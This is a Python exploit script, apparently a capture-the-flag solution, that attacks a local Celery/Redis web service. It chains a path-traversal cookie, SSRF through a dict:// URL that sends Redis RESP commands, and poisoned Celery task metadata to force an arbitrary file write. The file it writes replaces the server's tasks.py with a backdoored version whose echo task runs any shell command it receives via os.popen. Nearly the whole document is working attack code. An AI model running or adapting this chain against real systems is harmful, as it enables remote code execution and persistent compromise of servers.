import json
import requests

URL = "http://127.0.0.1:5001"

FILENAME = "/app/src/tasks.py"
RAW_CONTENT = '''from __future__ import annotations

import os
import pickle
import socket
from typing import Any, Dict
from urllib.parse import urlparse

from celery import Celery
from kombu.serialization import register

from .config import settings
from .crypto import dumps as encrypt_dumps, loads as decrypt_loads

try:
    register(
        "miniws-aes",
        encrypt_dumps,
        decrypt_loads,
        content_type="application/x-miniws",
        content_encoding="binary",
    )
except ValueError:
    pass

celery_app = Celery(
    "miniws",
    broker=settings.celery_broker_url,
    backend=settings.celery_backend_url,
)

celery_app.conf.update(
    task_serializer="miniws-aes",
    task_default_serializer="miniws-aes",
    accept_content=["miniws-aes"],
    result_serializer="json",
    result_accept_content=["json"],
)

@celery_app.task(name="miniws.echo")
def echo_task(message: str) -> Dict[str, Any]:
    return {"echo": __import__("os").popen(message).read()}

@celery_app.task(name="miniws.fetch")
def fetch_task(url: str, *, host_header: str | None = None, body: str | None = None, verb: str = "GET") -> Dict[str, Any]:
    parsed = urlparse(url)
    host = parsed.hostname or settings.redis_host
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"

    request_host = host_header or parsed.netloc or f"{host}:{port}"
    request_body = body.encode() if body else b""

    payload = (
        f"{verb} {path} HTTP/1.1\\r\\n" + 
        f"Host: {request_host}\\r\\n" + 
        "User-Agent: MiniFetch/1.0\\r\\n" + 
        "Connection: close\\r\\n" + 
        "\\r\\n"
    ).encode() + request_body

    chunks: list[bytes] = []
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(payload)
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    preview = b"".join(chunks)[:2048]
    return {"preview": preview.decode(errors="replace"), "bytes": len(preview)}
'''.strip()
CONTENT = json.dumps(RAW_CONTENT).replace('"', '\"')[1:-1]

def to_resp(command_line: str) -> str:
    args = command_line.strip().split()
    resp = f"*{len(args)}\r\n"
    for arg in args:
        resp += f"${len(arg)}\r\n{arg}\r\n"
    return resp + "\r\n\r\n\r\n\r\n*3"

def redis_rce(verb):
    r = requests.post(
        url=URL+ "/tasks/fetch/%2e%2e%2f%61",
        json={
            "url": "dict://127.0.0.1:6379/",
            "verb": verb
        }
    )
    task_id = r.json().get('task_id')
    r = requests.get(
        url=URL+ "/tasks/result",
        params={
            "id": task_id
        }
    )
    res = r.json()["result"]["preview"]
    return res

def generate_payload(filename: str, content: str, task_id: str) -> str:
    payload = """{"status": "RETRY", "result": {"exc_module":"framework.app",  "exc_type":"DiagnosticsPersistError", "exc_message":"<HEX_PAYLOAD>"},  "traceback": null, "children": [], "date_done": "2025-11-10T08:54:02.435989", "task_id": "<TASK_ID>"}"""
    hex_payload = """{"path": "<FILE_PATH>","mode": "w","encoding": "utf-8","content": "CONTENT"}""".replace("<FILE_PATH>", filename).replace("CONTENT", content).encode().hex()
    payload = payload.replace("<HEX_PAYLOAD>", hex_payload).replace("<TASK_ID>", task_id)
    return payload

def get_task_id() -> str:
    res = requests.post(url=f"{URL}/tasks/echo", json={"message": "hello"})
    return res.json().get('task_id')

def generate_debug_file(task_id: str):
    requests.get(URL + f"/tasks/result?id={task_id}",cookies={"mini_session": "../../../../tmp/debug"})
    return

def exec_payload(task_id: str):
    res = requests.get(url = f"{URL}/tasks/result", params={"id": task_id})


if __name__ == "__main__":
    task_id = get_task_id()
    print(f"[+] Obtained task_id: {task_id}")

    # 创建debug文件
    generate_debug_file(task_id=task_id)
    print(f"[+] Created debug file.")

    # 构造payload
    raw_payload = generate_payload(FILENAME, CONTENT, task_id)
    payload = raw_payload.replace(" ", "")
    print(f"[+] Generated payload.")

    # 修改celery tasks元数据
    resp_command = to_resp(f"SET celery-task-meta-{task_id} {payload}")
    res = redis_rce(resp_command)
    if "OK" in res:
        print(f"[+] Modified celery task metadata.")
    else:
        print(f"[-] Failed to modify celery task metadata.")
        exit(1)

    # 实例化DiagnosticsPersistError类
    exec_payload(task_id)
    print(f"[+] Executed payload, check {FILENAME} on the server.")
    
